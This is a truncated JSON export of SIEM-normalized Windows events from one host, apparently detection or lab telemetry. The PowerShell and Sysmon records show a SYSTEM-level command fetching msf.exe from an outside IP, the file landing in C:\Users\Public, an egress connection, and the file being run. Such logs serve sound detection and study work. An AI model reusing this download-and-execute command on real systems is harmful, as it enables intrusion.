    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:13:30.9247377Z\"},\"EventRecordID\":\"248781\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0003-4dbe-6208953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"wget http://3.5.140.10/msf.exe -o msf.exe -usebasicparsing\"},{\"Name\":\"ScriptBlockId\",\"text\":\"6503d2e7-aad4-40b3-b9f8-8b46959d3713\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "6503d2e7-aad4-40b3-b9f8-8b46959d3713",
      "object.process.cmdline": "wget http://3.5.140.10/msf.exe -o msf.exe -usebasicparsing",
      "object.process.id": "7564",
      "object.value": "wget http://3.5.140.10/msf.exe -o msf.exe -usebasicparsing",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:13:30.9240000Z",
      "uuid": "facfd651-ad92-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216183200794,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "facfd651-ad92-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:13:30.9240000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "create",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"11\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"11\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:13:31.1514953Z\"},\"EventRecordID\":\"2440372\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 14:13:31.145\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetFilename\",\"text\":\"C:\\\\Users\\\\Public\\\\msf.exe\"},{\"Name\":\"CreationUtcTime\",\"text\":\"2024-11-28 14:13:31.145\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "File System Object",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "datafield18": "powershell.exe (7564) [999] \u2190 powershell.exe (7280) [999] \u2190 ccmexec.exe (4660) [999]",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_11_File_create",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "11",
      "normalized": true,
      "object": "file_object",
      "object.fullpath": "c:\\users\\public\\msf.exe",
      "object.name": "msf.exe",
      "object.path": "c:\\users\\public\\",
      "object.property": "creation time",
      "object.value": "2024-11-28T14:13:31.1450000Z",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.chain": "powershell.exe \u2190 powershell.exe \u2190 ccmexec.exe",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:13:31.1510000Z",
      "uuid": "f89e9eb0-ad92-11ef-b052-005056b7517e",
      "text": "The process powershell.exe created the file msf.exe on host wperry.dev.it.stf",
      "_checkpoint": 216183136861,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "f89e9eb0-ad92-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:13:31.1510000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "detect",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"3\",\"Version\":\"5\",\"Level\":\"4\",\"Task\":\"3\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:13:32.5991440Z\"},\"EventRecordID\":\"2440373\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"4980\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 14:13:16.923\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"},{\"Name\":\"Protocol\",\"text\":\"tcp\"},{\"Name\":\"Initiated\",\"text\":\"true\"},{\"Name\":\"SourceIsIpv6\",\"text\":\"false\"},{\"Name\":\"SourceIp\",\"text\":\"10.156.92.66\"},{\"Name\":\"SourceHostname\",\"text\":\"wperry.dev.it.stf\"},{\"Name\":\"SourcePort\",\"text\":\"53982\"},{\"Name\":\"SourcePortName\",\"text\":\"-\"},{\"Name\":\"DestinationIsIpv6\",\"text\":\"false\"},{\"Name\":\"DestinationIp\",\"text\":\"3.5.140.10\"},{\"Name\":\"DestinationHostname\",\"text\":\"-\"},{\"Name\":\"DestinationPort\",\"text\":\"80\"},{\"Name\":\"DestinationPortName\",\"text\":\"http\"}]}}}",
      "category.generic": "Connection",
      "category.high": "Network Interaction Management",
      "category.low": "State",
      "direction": "egress",
      "dst.host": "3.5.140.10",
      "dst.ip": "3.5.140.10",
      "dst.port": 80,
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.ip": "10.156.92.66",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_3_Network_connection",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "3",
      "normalized": true,
      "object": "connection",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "object.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "object.process.id": "7564",
      "object.process.name": "powershell.exe",
      "object.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "protocol": "tcp",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "src.fqdn": "wperry.dev.it.stf",
      "src.host": "wperry.dev.it.stf",
      "src.hostname": "wperry",
      "src.ip": "10.156.92.66",
      "src.port": 53982,
      "status": "success",
      "subject": "rule",
      "subject.name": "-",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:13:32.5990000Z",
      "uuid": "f89e9eb1-ad92-11ef-b052-005056b7517e",
      "text": "A tcp connection from host wperry.dev.it.stf to host 3.5.140.10 is opened on host wperry.dev.it.stf",
      "_checkpoint": 216183136862,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "f89e9eb1-ad92-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:13:32.5990000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:13:49.9898781Z\"},\"EventRecordID\":\"248830\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0001-6557-6308953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\".\\\\msf\"},{\"Name\":\"ScriptBlockId\",\"text\":\"321f98c4-4571-4405-ad7c-087addb31693\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "321f98c4-4571-4405-ad7c-087addb31693",
      "object.process.cmdline": ".\\msf",
      "object.process.id": "7564",
      "object.value": ".\\msf",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:13:49.9890000Z",
      "uuid": "0c897f1a-ad93-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216184193865,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "0c897f1a-ad93-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:13:49.9890000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "create",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"11\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"11\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T14:30:11.7345282Z\"},\"EventRecordID\":\"2447152\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 14:30:11.726\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetFilename\",\"text\":\"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\PowerShell\\\\StartupProfileData-NonInteractive\"},{\"Name\":\"CreationUtcTime\",\"text\":\"2021-02-02 09:51:05.707\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "File System Object",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_11_File_create",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "11",
      "normalized": true,
      "object": "file_object",
      "object.fullpath": "c:\\windows\\system32\\config\\systemprofile\\appdata\\local\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
      "object.name": "startupprofiledata-noninteractive",
      "object.path": "c:\\windows\\system32\\config\\systemprofile\\appdata\\local\\microsoft\\windows\\powershell\\",
      "object.property": "creation time",
      "object.value": "2021-02-02T09:51:05.7070000Z",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T14:30:11.7340000Z",
      "uuid": "486510da-ad95-11ef-b052-005056b7517e",
      "text": "The process powershell.exe created the file startupprofiledata-noninteractive on host wperry.dev.it.stf",
      "_checkpoint": 216214784582,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "486510da-ad95-11ef-b052-005056b7517e",
        "time": "2024-11-28T14:30:11.7340000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:25.7773736Z\"},\"EventRecordID\":\"2436637\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:25.770\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746d-6748-221c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7280\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\mscoreei.dll\"},{\"Name\":\"FileVersion\",\"text\":\"4.8.9093.0 built by: NET481REL1LAST_C\"},{\"Name\":\"Description\",\"text\":\"Microsoft .NET Runtime Execution Engine\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae .NET Framework\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"mscoreei.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\mscoreei.dll",
      "object.process.hash": "IMPHASH:BDAAD270BEE58C9A3A7622CD1CA3EF79 MD5:89AB48AC59F9E5302E10A6A2ED5E9F9E SHA256:791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD",
      "object.process.hash.imphash": "BDAAD270BEE58C9A3A7622CD1CA3EF79",
      "object.process.hash.md5": "89AB48AC59F9E5302E10A6A2ED5E9F9E",
      "object.process.hash.sha256": "791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD",
      "object.process.meta": "Description:Microsoft .NET Runtime Execution Engine | Product:Microsoft\u00ae .NET Framework | Company:Microsoft Corporation",
      "object.process.name": "mscoreei.dll",
      "object.process.original_name": "mscoreei.dll",
      "object.process.path": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "4.8.9093.0 built by: NET481REL1LAST_C",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746d-6748-221c-010000003000",
      "subject.process.id": "7280",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:25.7770000Z",
      "uuid": "54df3ebd-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module mscoreei.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856652,
      "origin_app_alias": "MP-1",
